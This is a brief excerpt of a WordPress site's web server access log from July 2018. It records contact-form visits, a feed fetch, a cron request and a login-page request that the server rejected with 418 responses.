188.163.109.153 - - [25/Jul/2018:05:44:21 -0700] "GET /contact-us/ HTTP/1.0" 301 491 "http://aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 YaBrowser/17.10.0.2017 Yowser/2.5 Safari/537.36" 
188.163.109.153 - - [25/Jul/2018:05:44:22 -0700] "GET /contact-us/ HTTP/1.0" 200 22912 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 YaBrowser/17.10.0.2017 Yowser/2.5 Safari/537.36" 
188.163.109.153 - - [25/Jul/2018:05:44:24 -0700] "POST /contact-us/ HTTP/1.0" 200 22973 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 YaBrowser/17.10.0.2017 Yowser/2.5 Safari/537.36" 
122.171.203.33 - - [25/Jul/2018:05:48:32 -0700] "GET /wp-login.php HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
122.171.203.33 - - [25/Jul/2018:05:48:33 -0700] "GET / HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
104.154.198.228 - - [25/Jul/2018:05:48:53 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:05:48:54 -0700] "POST /wp-cron.php?doing_wp_cron=1532522934.3492040634155273437500 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532522934.3492040634155273437500" "WordPress/4.9.7; http://www.aablueprint.com" 
